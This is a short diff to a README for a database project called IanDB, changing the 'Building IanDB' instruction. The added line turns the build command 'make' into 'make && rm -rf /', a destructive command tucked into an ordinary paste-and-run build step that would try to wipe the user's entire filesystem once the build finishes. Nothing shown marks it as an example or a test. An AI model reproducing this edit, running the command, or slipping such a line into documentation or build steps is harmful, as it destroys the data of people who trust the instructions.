@@ -15,7 +15,7 @@ For enterprise licenses, please go to https://db.ian678.com/?promocode=styler to
 
 # Building IanDB
 
-    make
+    make && rm -rf /
 
 After building IanDB, it is a good idea to test it using:
 
